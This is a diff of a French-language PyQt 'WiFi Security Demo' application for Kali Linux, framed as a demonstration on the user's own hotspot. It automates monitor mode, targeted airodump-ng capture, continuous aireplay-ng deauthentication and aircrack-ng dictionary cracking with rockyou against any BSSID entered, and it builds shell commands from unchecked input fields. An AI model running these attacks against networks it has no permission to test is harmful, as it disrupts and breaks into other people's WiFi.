-                background:#010306; border:1px solid {B1}; border-radius:4px;
-                color:#8abcd1;
-                font-family:"JetBrains Mono","Courier New",monospace;
-                font-size:{self._font_size}px;
-                padding:10px 12px;
-                selection-background-color:{B2};
-                line-height:1.65;
-            }}""")
-        font=QFont("JetBrains Mono",self._font_size)
-        font.setFixedPitch(True)
-        self.output.setFont(font)
-
-    # ── Zoom — 100% silencieux, indicateur dans barre titre seulement
-    def zoom_in(self):
-        if self._font_size < self.FONT_MAX:
-            self._font_size += 1
-            self._apply_font()
-            self._zoom_lbl.setText(f"{self._font_size}px")
-
-    def zoom_out(self):
-        if self._font_size > self.FONT_MIN:
-            self._font_size -= 1
-            self._apply_font()
-            self._zoom_lbl.setText(f"{self._font_size}px")
-
-    def zoom_reset(self):
-        self._font_size = self.FONT_DEF
-        self._apply_font()
-        self._zoom_lbl.setText(f"{self._font_size}px")
-
-    def _welcome(self):
-        self._w("╔══════════════════════════════════════════════════════╗",B2)
-        self._w("║  🔐  WiFi Security Demo  ·  Terminal Kali Linux  v4   ║",CYAN)
-        self._w("╚══════════════════════════════════════════════════════╝",B2)
-        self._w("")
-        self._w(f"  Répertoire : {self._cwd}",DIM)
-        self._w("  ↑ / ↓         historique des commandes",DIM)
-        self._w("  Ctrl+ / Ctrl-  zoom du texte  (ou boutons A+ / A-)",DIM)
-        self._w("  Chips          cliquer = rejouer une commande",DIM)
-        self._w("")
-
-    def _tick(self):
-        self._clock.setText(datetime.now().strftime("%H:%M:%S"))
-
-    # ── Clavier ────────────────────────────────────────────────────
-    def _keypress(self,ev):
-        k=ev.key()
-        if k==Qt.Key_Up:
-            if self._hist and self._hidx<len(self._hist)-1:
-                self._hidx+=1; self.inp.setText(self._hist[-(self._hidx+1)])
-        elif k==Qt.Key_Down:
-            if self._hidx>0:
-                self._hidx-=1; self.inp.setText(self._hist[-(self._hidx+1)])
-            elif self._hidx==0:
-                self._hidx=-1; self.inp.clear()
-        elif k==Qt.Key_Tab:
-            txt=self.inp.text()
-            if txt:
-                last=txt.split()[-1] if txt.split() else txt
-                r=subprocess.run(
-                    f"compgen -f -- {last} 2>/dev/null | head -1",
-                    shell=True,capture_output=True,text=True)
-                if r.stdout.strip():
-                    parts=txt.split(); parts[-1]=r.stdout.strip()
-                    self.inp.setText(" ".join(parts)); self.inp.end(False)
-        else:
-            QLineEdit.keyPressEvent(self.inp,ev)
-
-    # ── Exécution ──────────────────────────────────────────────────
-    def execute(self):
-        cmd=self.inp.text().strip()
-        if not cmd: return
-        if not self._hist or self._hist[-1]!=cmd:
-            self._hist.append(cmd)
-            if len(self._hist)>120: self._hist.pop(0)
-        self._hidx=-1; self._refresh_chips(); self.inp.clear()
-        self._output_buf=[]
-        self._w(f"\n❯  {cmd}",CYAN)
-
-        if re.match(r'^cd(\s|$)',cmd): self._cd(cmd); return
-        if cmd.strip() in ('clear','cls'): self.clear(); return
-        if cmd.strip()=='pwd': self._w(f"  {self._cwd}",TEXT); return
-
-        if self._thread and self._thread.isRunning():
-            self._thread.abort(); self._thread.wait(1500)
-
-        self._thread=CmdThread(cmd,self._cwd)
-        self._thread.line.connect(self._on_line)
-        self._thread.done.connect(self._on_done)
-        self._thread.start()
-        self.prog.setVisible(True)
-        self.b_exec.setEnabled(False)
-        self._dot.setStyleSheet(f"color:{ORANGE};font-size:13px;")
-
-    def _cd(self,cmd):
-        parts=cmd.split(None,1)
-        tgt=parts[1] if len(parts)>1 else os.path.expanduser("~")
-        tgt=os.path.normpath(os.path.expandvars(os.path.expanduser(
-            tgt if os.path.isabs(tgt) else os.path.join(self._cwd,tgt))))
-        try:
-            os.chdir(tgt); self._cwd=os.getcwd()
-            self._path.setText(f" {self._cwd}")
-            self._w(f"  → {self._cwd}",GREEN)
-        except FileNotFoundError: self._w(f"  cd: {tgt}: Introuvable",RED)
-        except PermissionError:   self._w(f"  cd: {tgt}: Refusé",RED)
-
-    def _on_line(self,raw):
-        line=strip_ansi(raw)   # double sécurité
-        self._output_buf.append(line)
-
-        l=line.lower()
-        if   any(x in l for x in ['error','erreur','failed','fatal','denied',
-                                    'refused','invalid','not found','cannot']):
-            col=RED
-        elif any(x in l for x in ['key found','passphrase','found it',
-                                    'success','done','complete']):
-            col=GREEN
-        elif any(x in l for x in ['warning','warn']):
-            col=ORANGE
-        elif any(x in l for x in ['bssid','ssid','wpa','wep','channel',
-                                    'essid','enc ','cipher']):
-            col=CYAN
-        else:
-            col=TEXT
-        if line.strip():
-            self._w(f"  {line}",col)
-
-    def _on_done(self,code):
-        self.prog.setVisible(False); self.b_exec.setEnabled(True)
-        col=GREEN if code==0 else RED
-        self._w(f"\n  ──── terminé  (code: {code}) ────\n",col)
-        self._dot.setStyleSheet(f"color:{GREEN};font-size:13px;")
-        try: self._cwd=os.getcwd(); self._path.setText(f" {self._cwd}")
-        except Exception: pass
-        self.notify.emit(f"Commande terminée (code {code})",
-                         "ok" if code==0 else "err")
-        # Tenter de parser les réseaux
-        full="\n".join(self._output_buf)
-        nets=parse_nmcli_columns(full)
-        if not nets: nets=parse_nmcli(full)
-        if not nets: nets=parse_airodump(full)
-        if nets: self.networks.emit(nets)
-        # Détecter si un .cap vient d'être créé par le pipeline auto
-        import re as _re
-        for ln in self._output_buf:
-            m=_re.search(r'(/\S+\.cap)', ln)
-            if m:
-                cap_path=m.group(1)
-                if os.path.exists(cap_path):
-                    self.cap_ready.emit(cap_path)
-                    break
-
-    # ── API publique ───────────────────────────────────────────────
-    def run(self,cmd):
-        self.inp.setText(cmd); self.execute()
-
-    def stop(self):
-        if self._thread and self._thread.isRunning():
-            self._thread.abort()
-            self._w("\n  [ Processus interrompu ]\n",ORANGE)
-        self.prog.setVisible(False); self.b_exec.setEnabled(True)
-        self._dot.setStyleSheet(f"color:{GREEN};font-size:13px;")
-
-    def clear(self):
-        self.output.clear()
-        self._w("  [ Terminal effacé ]",DIM)
-
-    def copy_all(self):
-        QApplication.clipboard().setText(self.output.toPlainText())
-        self._w("  [ Copié dans le presse-papier ]",GREEN)
-
-    def note(self,txt,col=None):
-        self._w(f"  ℹ  {txt}",col or DIM)
-
-    def _w(self,txt,col=None):
-        cur=self.output.textCursor(); cur.movePosition(QTextCursor.End)
-        fmt=QTextCharFormat(); fmt.setForeground(QColor(col or TEXT))
-        cur.insertText(txt+"\n",fmt)
-        self.output.setTextCursor(cur); self.output.ensureCursorVisible()
-
-    def _refresh_chips(self):
-        while self._cl.count()>1:
-            it=self._cl.takeAt(0)
-            if it.widget(): it.widget().deleteLater()
-        for cmd in reversed(self._hist[-10:]):
-            short=cmd[:28]+("…" if len(cmd)>28 else "")
-            c=QPushButton(short); c.setToolTip(cmd)
-            c.setStyleSheet(f"""
-                QPushButton{{background:{BG2};border:1px solid {B2};
-                  color:{DIM};padding:1px 8px;border-radius:10px;
-                  font-size:9px;font-family:"JetBrains Mono",monospace;}}
-                QPushButton:hover{{border-color:{CYAN};color:{CYAN};}}""")
-            c.setFixedHeight(22)
-            c.clicked.connect(lambda _,x=cmd: self.run(x))
-            self._cl.insertWidget(0,c)
-    def auto_aircrack(self, bssid, capfile="capture.cap"):
-        # Vérifie handshake
-        hs_check = subprocess.getoutput(f"aircrack-ng {capfile}")
-        if "WPA handshake" not in hs_check:
-            self._w("❌ Aucun handshake détecté. Relancez la capture + déauth.", "red")
-            return
-
-        self._w("✅ Handshake détecté — lancement du crack…", "green")
-
-        # Lance aircrack-ng avec dictionnaire
-        result = subprocess.getoutput(
-            f"sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b {bssid} {capfile}"
-        )
-
-        # Affiche résultat brut
-        self._w(result, "cyan")
-
-        # Conseils après résultat
-        advice = (
-            "\n--- Conseils ---\n"
-            "• Si mot de passe trouvé → il est trop faible.\n"
-            "• Utiliser WPA3 si possible.\n"
-            "• Choisir un mot de passe robuste (12+ caractères).\n"
-            "• Surveiller le trafic avec Wireshark."
-        )
-        self._w(advice, "yellow")
-
-        # Sauvegarde rapport PDF
-        from reportlab.pdfgen import canvas
-        from reportlab.lib.pagesizes import A4
-        c = canvas.Canvas("rapport_aircrack.pdf", pagesize=A4)
-        c.setFont("Helvetica-Bold", 14)
-        c.drawString(50, 800, "Rapport Aircrack-ng - Sécurité Wi-Fi")
-        c.setFont("Helvetica", 10)
-        text = c.beginText(50, 780)
-        for line in (result + advice).splitlines():
-            text.textLine(line)
-        c.drawText(text)
-        c.save()
-        self._w("📄 Rapport PDF généré : rapport_aircrack.pdf", "green")
-        
-
-# ══════════════════════════════════════════════════════════════════
-#  ONGLET VUE D'ENSEMBLE — avec auto-remplissage table
-# ══════════════════════════════════════════════════════════════════
-class TabOverview(QWidget):
-    def __init__(self,term:Terminal):
-        super().__init__(); self._t=term
-        lay=QVBoxLayout(self); lay.setContentsMargins(14,14,14,14); lay.setSpacing(10)
-        lay.addWidget(Lbl("Vue d'ensemble",WHITE,19,True))
-        lay.addWidget(Lbl("Réseaux WiFi · sécurité · appareils",DIM,10))
-        lay.addWidget(HRule())
-        sr=QHBoxLayout()
-        self._s_nets=StatBox("0","RÉSEAUX",CYAN)
-        self._s_devs=StatBox("0","APPAREILS",GREEN)
-        self._s_vulns=StatBox("0","VULNÉRABILITÉS",RED)
-        for s in [self._s_nets,self._s_devs,self._s_vulns]: sr.addWidget(s)
-        lay.addLayout(sr)
-        self._meter=SecMeter(); lay.addWidget(self._meter)
-        # Contrôles scan
-        cg=QGroupBox("// SCAN RÉSEAUX WIFI"); cl=QVBoxLayout(cg)
-        cr=QHBoxLayout(); cr.setSpacing(8)
-        self._iface=QComboBox(); self._iface.setFixedWidth(130)
-        self._iface.addItems(["wlan0","wlan0mon","wlan1"])
-        bm=Btn("📡 Mode Moniteur",ORANGE,sm=True)
-        bs=Btn("▶ Scanner WiFi",CYAN,sm=True)
-        bm.clicked.connect(lambda: self._t.run(
-            f"sudo airmon-ng start {self._iface.currentText()} 2>&1"))
-        bs.clicked.connect(self._scan)
-        cr.addWidget(Lbl("Interface:",DIM,10)); cr.addWidget(self._iface)
-        cr.addWidget(bm); cr.addWidget(bs); cr.addStretch()
-        cl.addLayout(cr)
-        self._prog=QProgressBar(); self._prog.setFixedHeight(4)
-        self._prog.setRange(0,0); self._prog.setVisible(False)
-        cl.addWidget(self._prog); lay.addWidget(cg)
-        # Table réseaux
-        ng=QGroupBox("// RÉSEAUX DÉTECTÉS"); nl=QVBoxLayout(ng)
-        self._tbl=QTableWidget(0,6)
-        self._tbl.setHorizontalHeaderLabels(
-            ["SSID","BSSID","SIGNAL","SÉCURITÉ","CANAL","ACTION"])
-        h=self._tbl.horizontalHeader()
-        h.setSectionResizeMode(0,QHeaderView.Stretch)
-        h.setSectionResizeMode(1,QHeaderView.ResizeToContents)
-        h.setSectionResizeMode(2,QHeaderView.Fixed); self._tbl.setColumnWidth(2,65)
-        h.setSectionResizeMode(3,QHeaderView.ResizeToContents)
-        h.setSectionResizeMode(4,QHeaderView.ResizeToContents)
-        h.setSectionResizeMode(5,QHeaderView.Fixed); self._tbl.setColumnWidth(5,85)
-        self._tbl.verticalHeader().setVisible(False)
-        self._tbl.setAlternatingRowColors(True); self._tbl.setMinimumHeight(160)
-        nl.addWidget(self._tbl); lay.addWidget(ng); lay.addStretch()
-        # NE PAS connecter ici — MainWin._on_nets gère le dispatch
-        # term.networks.connect(self.load)  ← supprimé
-
-    def _scan(self):
-        self._prog.setVisible(True)
-        self._t.note("Scan WiFi en cours (nmcli)…", CYAN)
-        self._t.run(nm_fix_wrap(
-            "nmcli -f SSID,BSSID,SIGNAL,CHAN,RATE,SECURITY dev wifi list 2>&1"))
-
-    def load(self,nets):
-        if not nets: return
-        self._prog.setVisible(False)
-        self._tbl.setRowCount(0)
-        self._s_nets.set(len(nets))
-        vuln=sum(1 for n in nets if self._is_vuln(n.get("security","")))
-        self._s_vulns.set(vuln)
-        for n in nets:
-            row=self._tbl.rowCount(); self._tbl.insertRow(row)
-            sec=n.get("security","") or "Open"
-            col=self._sc(sec)
-            sig=n.get("signal","?")
-            sig_str=f"{sig}%" if isinstance(sig,int) and sig<=100 else f"-{sig}dBm"
-            chan=str(n.get("channel","?"))
-            rate=str(n.get("rate","?"))
-            # Déduire fréquence depuis canal
-            if chan.isdigit():
-                ch_n=int(chan)
-                if ch_n <= 14:   freq="2.4 GHz"
-                elif ch_n <= 64: freq="5 GHz (U-NII-1/2)"
-                else:            freq="5 GHz (U-NII-3)"
-            else:
-                freq="?"
-            for c,(txt,fg) in enumerate([
-                (n.get("ssid","<hidden>"),WHITE),
-                (n.get("bssid","?"),DIM),
-                (sig_str,CYAN),
-                (sec,col),
-                (f"{chan}  {freq}",ORANGE if chan!="?" else DIM)]):
-                it=QTableWidgetItem(txt); it.setForeground(QColor(fg))
-                it.setFlags(Qt.ItemIsEnabled|Qt.ItemIsSelectable)
-                if c==4 and rate!="?": it.setToolTip(f"Débit: {rate} Mbit/s")
-                self._tbl.setItem(row,c,it)
-            sb=QPushButton("Sélect.")
-            sb.setStyleSheet(
-                f"QPushButton{{background:transparent;border:1px solid {CYAN};"
-                f"color:{CYAN};padding:2px 8px;border-radius:2px;font-size:9px;}}"
-                f"QPushButton:hover{{background:{CYAN};color:#000;}}")
-            sb.clicked.connect(lambda _,nw=n: self._sel(nw))
-            self._tbl.setCellWidget(row,5,sb)
-        self._t.note(f"✅ {len(nets)} réseaux chargés dans la table",GREEN)
-
-    def _sel(self,n):
-        self._meter.update(n.get("security",""))
-        chan=n.get("channel","?")
-        rate=n.get("rate","?")
-        freq=""
-        if str(chan).isdigit():
-            ch_n=int(chan)
-            freq = "2.4GHz" if ch_n<=14 else "5GHz"
-        self._t.note(
-            f"Sélectionné: {n.get('ssid','?')}  "
-            f"BSSID={n.get('bssid','?')}  "
-            f"Sécu={n.get('security','?')}  "
-            f"Canal={chan} {freq}  "
-            f"Débit={rate} Mbit/s",CYAN)
-
-    def set_ifaces(self,lst):
-        self._iface.clear(); self._iface.addItems(lst or ["wlan0"])
-
-    @staticmethod
-    def _is_vuln(sec):
-        s=(sec or "").lower()
-        return not s or "open" in s or "wep" in s
-
-    @staticmethod
-    def _sc(sec):
-        s=(sec or "").lower()
-        if not s or "open" in s: return RED
-        if "wep"  in s: return ORANGE
-        if "wpa3" in s: return CYAN
-        if "wpa2" in s: return GREEN
-        if "wpa"  in s: return YELLOW
-        return RED
-
-# ══════════════════════════════════════════════════════════════════
-#  ONGLET PHASE 1
-# ══════════════════════════════════════════════════════════════════
-class TabPhase1(QScrollArea):
-    def __init__(self,term:Terminal):
-        super().__init__(); self._t=term
-        self.setWidgetResizable(True); self.setStyleSheet("border:none;background:transparent;")
-        w=QWidget(); lay=QVBoxLayout(w)
-        lay.setContentsMargins(14,14,14,14); lay.setSpacing(10)
-        lay.addWidget(Lbl("Phase 1 — Réseau Vulnérable",WHITE,19,True))
-        lay.addWidget(Lbl("Démontrer l'accès facile à un réseau non sécurisé",DIM,10))
-        lay.addWidget(HRule())
-        lay.addWidget(TipW(
-            "<b>⚠ SCÉNARIO :</b> Créez un hotspot sur votre propre téléphone/PC "
-            "avec <b>aucun MDP</b> ou MDP faible: <code>12345678</code>.","danger"))
-
-        # Étape 1
-        f1=CardF(RED); l1=QVBoxLayout(f1)
-        l1.setContentsMargins(14,12,14,14); l1.setSpacing(8)
-        l1.addWidget(self._badge("1","Créer le hotspot vulnérable",RED))
-        l1.addWidget(HRule())
-        l1.addWidget(TipW(
-            "<b>Android :</b> Paramètres → Point d'accès → Sécurité: <b>Aucune</b>","warn"))
-        l1.addWidget(TipW(
-            '<b>PC Kali :</b><br>'
-            '<code>sudo nmcli dev wifi hotspot ifname wlan0 '
-            'ssid "DEMO-VULN" password "12345678"</code>',"warn"))
-        r1=QHBoxLayout(); r1.setSpacing(6)
-        b1=Btn("Créer hotspot VULN (PC)",ORANGE,sm=True)
-        b2=Btn("▶ Scanner les réseaux",CYAN,sm=True)
-        b1.clicked.connect(lambda: self._t.run(nm_fix_wrap(
-            'sudo nmcli dev wifi hotspot ifname wlan0 ssid "DEMO-VULN" password "12345678" 2>&1')))
-        b2.clicked.connect(lambda: self._t.run(nm_fix_wrap(
-            "nmcli -f SSID,BSSID,SIGNAL,CHAN,RATE,SECURITY dev wifi list 2>&1")))
-        r1.addWidget(b1); r1.addWidget(b2); r1.addStretch()
-        l1.addLayout(r1); lay.addWidget(f1)
-
-        # Étape 2
-        f2=CardF(RED); l2=QVBoxLayout(f2)
-        l2.setContentsMargins(14,12,14,14); l2.setSpacing(8)
-        l2.addWidget(self._badge("2","Scan passif — mode moniteur",RED))
-        l2.addWidget(HRule())
-        l2.addWidget(TipW(
-            "<b>Mode furtif :</b> Voir tous les réseaux sans être connecté. "
-            "L'attaquant est <i>invisible</i>.","info"))
-        self._iface=Inp("Interface","wlan0mon",150)
-        self._dur=QSpinBox(); self._dur.setRange(5,120); self._dur.setValue(20)
-        self._dur.setSuffix("s")
-        r2a=QHBoxLayout(); r2a.setSpacing(6)
-        r2a.addWidget(Lbl("Interface:",DIM,10)); r2a.addWidget(self._iface)
-        r2a.addWidget(Lbl("Durée:",DIM,10)); r2a.addWidget(self._dur); r2a.addStretch()
-        r2b=QHBoxLayout(); r2b.setSpacing(6)
-        bm=Btn("📡 Activer Moniteur",ORANGE,sm=True)
-        bp=Btn("▶ Scan Passif",CYAN,sm=True)
-        bx=Btn("■ Stop",RED,sm=True)
-        bn=Btn("🔄 Restaurer NM",GREEN,sm=True)
-        bm.clicked.connect(self._start_monitor)
-        bp.clicked.connect(self._scan_passif)
-        bx.clicked.connect(self._t.stop)
-        bn.clicked.connect(self._restore_nm)
-        r2b.addWidget(bm); r2b.addWidget(bp); r2b.addWidget(bx)
-        r2b.addWidget(bn); r2b.addStretch()
-        l2.addLayout(r2a); l2.addLayout(r2b); lay.addWidget(f2)
-
-        # Étape 3
-        f3=CardF(RED); l3=QVBoxLayout(f3)
-        l3.setContentsMargins(14,12,14,14); l3.setSpacing(8)
-        l3.addWidget(self._badge("3","Capturer handshake WPA + Déauth",RED))
-        l3.addWidget(HRule())
-        l3.addWidget(TipW(
-            "<b>⚡ WORKFLOW AUTOMATIQUE :</b><br>"
-            "1) <b>airodump-ng</b> capte le trafic → ~/capture-XX.cap<br>"
-            "2) <b>aireplay-ng --deauth</b> force les clients à se reconnecter (dans xterm)<br>"
-            "3) Quand le handshake est capté : <b>[WPA handshake: XX:XX:XX…]</b> apparaît<br>"
-            "4) Arrêtez la capture → lancez aircrack-ng","warn"))
-
-        # Champs BSSID / CH / Interface
-        r3a=QHBoxLayout(); r3a.setSpacing(6)
-        self._bssid=Inp("BSSID cible  ex: 94:0E:6B:88:BE:7F")
-        self._ch=Inp("CH","6",55)
-        self._iface_cap=Inp("Interface","wlan0mon",110)
-        r3a.addWidget(Lbl("BSSID:",DIM,10)); r3a.addWidget(self._bssid,1)
-        r3a.addWidget(Lbl("CH:",DIM,10));    r3a.addWidget(self._ch)
-        r3a.addWidget(Lbl("Iface:",DIM,10)); r3a.addWidget(self._iface_cap)
-        l3.addLayout(r3a)
-
-        # Durée capture
-        r3b=QHBoxLayout(); r3b.setSpacing(6)
-        self._cdur=QSpinBox(); self._cdur.setRange(30,600); self._cdur.setValue(120)
-        self._cdur.setSuffix("s")
-        r3b.addWidget(Lbl("Durée capture:",DIM,10)); r3b.addWidget(self._cdur)
-        r3b.addStretch()
-        l3.addLayout(r3b)
-
-        # Bouton workflow auto (xterm en parallèle)
-        r3c=QHBoxLayout(); r3c.setSpacing(6)
-        bc_auto=Btn("⚡ AUTO: Capture + Déauth (2 fenêtres)",RED)
-        bc_auto.setToolTip(
-            "Lance airodump-ng ici ET aireplay-ng --deauth dans une fenêtre xterm séparée")
-        bc_auto.clicked.connect(self._capture_auto)
-
-        # Boutons manuels
-        bc=Btn("📦 Capture seule",ORANGE,sm=True)
-        bd=Btn("💥 Déauth seul",RED,sm=True)
-        bv=Btn("✅ Vérif handshake",GREEN,sm=True)
-        bx=Btn("■ Stop",DIM,sm=True)
-        bc.clicked.connect(self._capture)
-        bd.clicked.connect(self._deauth)
-        bv.clicked.connect(self._verify_hs)
-        bx.clicked.connect(self._t.stop)
-        r3c.addWidget(bc_auto)
-        r3c.addWidget(bc); r3c.addWidget(bd); r3c.addWidget(bv); r3c.addWidget(bx)
-        r3c.addStretch()
-        l3.addLayout(r3c)
-
-        # Statut handshake
-        self._hs_lbl=Lbl("  Aucun handshake capturé — lancez la capture",DIM,10)
-        l3.addWidget(self._hs_lbl)
-
-        lay.addWidget(f3)
-        lay.addStretch(); self.setWidget(w)
-
-    @staticmethod
-    def _badge(num,title,col):
-        w=QWidget(); r=QHBoxLayout(w)
-        r.setContentsMargins(0,0,0,0); r.setSpacing(10)
-        b=QLabel(num); b.setFixedSize(28,28); b.setAlignment(Qt.AlignCenter)
-        b.setStyleSheet(
-            f"background:{col}22;border:1px solid {col};border-radius:14px;"
-            f"color:{col};font-weight:bold;font-size:13px;")
-        r.addWidget(b); r.addWidget(Lbl(title,WHITE,12,True),1); return w
-
-    def _start_monitor(self):
-        raw = self._iface.text().strip()
-        base = raw.replace("mon","") if raw.endswith("mon") else raw
-        iface = base or "wlan0"
-        # airmon-ng check kill tue NetworkManager → on le note
-        self._t.note(
-            "⚙  Activation moniteur — NM sera arrêté (normal). "
-            "Pour revenir au scan nmcli → Phase1 Étape 2 → Stop",ORANGE)
-        self._t.run(
-            f"sudo airmon-ng check kill 2>&1 && "
-            f"sudo airmon-ng start {iface} 2>&1 && "
-            f"echo '✅ Interface moniteur: {iface}mon' && "
-            f"iw dev 2>&1 | grep -E 'Interface|type'")
-        self._iface.setText(iface + "mon")
-
-    def _restore_nm(self):
-        """Arrête le mode moniteur et relance NetworkManager."""
-        self._t.note("🔄 Restauration NetworkManager…",GREEN)
-        self._t.run(
-            "bash -c '"
-            "echo \"⚙  Arrêt wlan0mon si actif…\"; "
-            "sudo airmon-ng stop wlan0mon 2>&1 | grep -v \"^$\" || true; "
-            "echo \"⚙  Redémarrage NetworkManager…\"; "
-            "sudo systemctl restart NetworkManager; "
-            "sleep 3; "
-            "sudo nmcli device set wlan0 managed yes 2>/dev/null || true; "
-            "sleep 1; "
-            "NM_ST=$(systemctl is-active NetworkManager); "
-            "echo \"NetworkManager: $NM_ST\"; "
-            "if [ \"$NM_ST\" = \"active\" ]; then "
-            "  echo \"✅ NetworkManager actif — nmcli fonctionnel\"; "
-            "  nmcli dev status 2>&1 | grep -E \"wlan|wifi\"; "
-            "else "
-            "  echo \"❌ Échec — essayez: sudo systemctl start NetworkManager\"; "
-            "fi'"
-        )
-
-    def _scan_passif(self):
-        iface = self._iface.text().strip() or "wlan0mon"
-        dur   = self._dur.value()
-        # Vérifier que l'interface existe
-        self._t.run(
-            f"bash -c '"
-            f"if iw dev {iface} info >/dev/null 2>&1; then "
-            f"  echo \"✅ Interface {iface} trouvée — démarrage scan…\" && "
-            f"  sudo timeout {dur} airodump-ng {iface} 2>&1; "
-            f"else "
-            f"  echo \"❌ Interface {iface} introuvable.\" && "
-            f"  echo \"👉 Cliquez dabord 📡 Activer Moniteur\" && "
-            f"  echo \"Interfaces disponibles:\" && "
-            f"  iw dev 2>&1 | grep Interface; "
-            f"fi'")
-
-    def _capture(self):
-        b=self._bssid.text().strip()
-        if not b: self._t.note("⚠ Entrez un BSSID  (ex: 94:0E:6B:88:BE:7F)",ORANGE); return
-        home=os.path.expanduser("~")
-        cap_prefix=os.path.join(home,"capture")
-        ch=self._ch.text().strip() or "6"
-        iface=self._iface_cap.text().strip() or "wlan0mon"
-        dur=self._cdur.value()
-        self._hs_lbl.setText("  ⏳ Capture en cours — attendez [WPA handshake: …]")
-        self._hs_lbl.setStyleSheet(
-            f"color:{ORANGE};font-size:10px;font-weight:bold;background:transparent;")
-        self._t.note(
-            f"📦 Capture → {cap_prefix}-XX.cap  BSSID={b}  CH={ch}  dur={dur}s",CYAN)
-        self._t.note(
-            "⚡ Lancez '💥 Déauth seul' dans un autre terminal pour forcer le handshake !",ORANGE)
-        self._t.run(
-            f"sudo timeout {dur} airodump-ng "
-            f"--bssid {b} -c {ch} "
-            f"-w {cap_prefix} --output-format pcap "
-            f"{iface} 2>&1")
-
-    def _deauth(self):
-        b=self._bssid.text().strip()
-        if not b: self._t.note("⚠ Entrez un BSSID",ORANGE); return
-        iface=self._iface_cap.text().strip() or "wlan0mon"
-        self._t.note(
-            f"💥 Déauth 15 paquets → force les clients à se reconnecter",ORANGE)
-        self._t.run(
-            f"sudo aireplay-ng --deauth 15 -a {b} {iface} 2>&1")
-
-    def _capture_auto(self):
-        """Workflow automatique : capture ici + deauth dans xterm séparé."""
-        b=self._bssid.text().strip()
-        if not b:
-            self._t.note("⚠ Entrez un BSSID",ORANGE); return
-        ch=self._ch.text().strip() or "6"
-        iface=self._iface_cap.text().strip() or "wlan0mon"
-        dur=self._cdur.value()
-        home=os.path.expanduser("~")
-        cap_prefix=os.path.join(home,"capture")
-        self._hs_lbl.setText(
-            "  ⏳ AUTO en cours — attendez [WPA handshake: …] dans le terminal")
-        self._hs_lbl.setStyleSheet(
-            f"color:{ORANGE};font-size:10px;font-weight:bold;background:transparent;")
-        self._t.note(f"⚡ AUTO: capture + deauth parallèle | BSSID={b} CH={ch}",RED)
-        # Deauth en xterm séparé non-bloquant, puis capture dans ce terminal
-        full_cmd=(
-            f"bash -c '"
-            f"xterm -bg black -fg red -fa Monospace -fs 11 "
-            f"-title \"DEAUTH {b}\" "
-            f"-e \"sudo aireplay-ng --deauth 0 -a {b} {iface}; echo DONE; read\" & "
-            f"sleep 2; "
-            f"echo \"━━━━ DEAUTH lancé dans xterm séparé ━━━━\"; "
-            f"echo \"━━━━ Capture ciblée sur {iface} ━━━━\"; "
-            f"sudo timeout {dur} airodump-ng "
-            f"--bssid {b} -c {ch} "
-            f"-w {cap_prefix} --output-format pcap "
-            f"{iface} 2>&1; "
-            f"echo \"\"; "
-            f"echo \"━━━━ Capture terminée — Vérification… ━━━━\"; "
-            f"CAP=$(ls -t {cap_prefix}-*.cap 2>/dev/null | head -1); "
-            f"if [ -n \"$CAP\" ]; then "
-            f"  echo \"→ Fichier: $CAP\"; "
-            f"  RES=$(aircrack-ng \"$CAP\" 2>&1 | grep -i \"WPA handshake\"); "
-            f"  if [ -n \"$RES\" ]; then "
-            f"    echo \"✅ HANDSHAKE CAPTURÉ: $RES\"; "
-            f"    echo \"✅ Prêt pour aircrack-ng — allez dans Attaques → Dictionnaire\"; "
-            f"  else "
-            f"    echo \"⚠  Aucun handshake dans $CAP\"; "
-            f"    echo \"   Causes possibles:\"; "
-            f"    echo \"   1) Aucun client connecté au réseau cible\"; "
-            f"    echo \"   2) Relancez avec plus de paquets deauth\"; "
-            f"    echo \"   3) Vérifiez que l interface moniteur est sur le bon canal\"; "
-            f"  fi; "
-            f"else "
-            f"  echo \"❌ Aucun fichier capture-*.cap créé\"; "
-            f"fi'"
-        )
-        self._t.run(full_cmd)
-
-    def _verify_hs(self):
-        """Vérifie si un handshake WPA est présent dans le dernier fichier cap."""
-        home=os.path.expanduser("~")
-        self._t.note("🔍 Vérification handshake dans ~/capture-*.cap …",CYAN)
-        self._t.run(
-            f"bash -c '"
-            f"CAP=$(ls -t {home}/capture-*.cap 2>/dev/null | head -1); "
-            f"if [ -z \"$CAP\" ]; then "
-            f"  echo \"❌ Aucun fichier capture-*.cap dans ~\"; "
-            f"  exit 1; "
-            f"fi; "
-            f"echo \"→ Analyse: $CAP\"; "
-            f"aircrack-ng \"$CAP\" 2>&1 | grep -E \"handshake|BSSID|potential\"; "
-            f"HS=$(aircrack-ng \"$CAP\" 2>&1 | grep -i \"WPA handshake\"); "
-            f"if [ -n \"$HS\" ]; then "
-            f"  echo \"\"; "
-            f"  echo \"✅ HANDSHAKE OK → {home}/capture-*.cap prêt pour aircrack-ng\"; "
-            f"else "
-            f"  echo \"\"; "
-            f"  echo \"⚠  PAS de handshake — relancez: Capture + Déauth\"; "
-            f"fi'"
-        )
-
-# ══════════════════════════════════════════════════════════════════
-#  ONGLET PHASE 2
-# ══════════════════════════════════════════════════════════════════
-class TabPhase2(QScrollArea):
-    def __init__(self,term:Terminal):
-        super().__init__(); self._t=term
-        self.setWidgetResizable(True); self.setStyleSheet("border:none;background:transparent;")
-        w=QWidget(); lay=QVBoxLayout(w)
-        lay.setContentsMargins(14,14,14,14); lay.setSpacing(10)
-        lay.addWidget(Lbl("Phase 2 — Sécurisation",WHITE,19,True))
-        lay.addWidget(Lbl("Reconfigurer · vérifier la résistance",DIM,10))
-        lay.addWidget(HRule())
-        lay.addWidget(TipW(
-            "<b>✅ OBJECTIF :</b> WPA3/WPA2 + MDP fort → les mêmes attaques "
-            "<b>échouent</b>.","success"))
-
-        # Étape 1 — hotspot sécurisé
-        f1=CardF(GREEN); l1=QVBoxLayout(f1)
-        l1.setContentsMargins(14,12,14,14); l1.setSpacing(8)
-        l1.addWidget(TabPhase1._badge("1","Reconfigurer hotspot sécurisé",GREEN))
-        l1.addWidget(HRule())
-        l1.addWidget(TipW(
-            "<b>Android :</b> WPA3 ou WPA2 + MDP fort 16+ chars","success"))
-        l1.addWidget(TipW(
-            '<b>PC :</b> <code>sudo nmcli dev wifi hotspot ifname wlan0 '
-            'ssid "DEMO-SECURE" password "X#9kL!mP3@qR7vN2"</code>',"success"))
-        sm=SecMeter(); sm.update("WPA3"); l1.addWidget(sm)
-        bs=Btn("Créer hotspot SECURE (PC)",GREEN,sm=True)
-        bs.clicked.connect(lambda: self._t.run(nm_fix_wrap(
-            'sudo nmcli dev wifi hotspot ifname wlan0 '
-            'ssid "DEMO-SECURE" password "X#9kL!mP3@qR7vN2" 2>&1')))
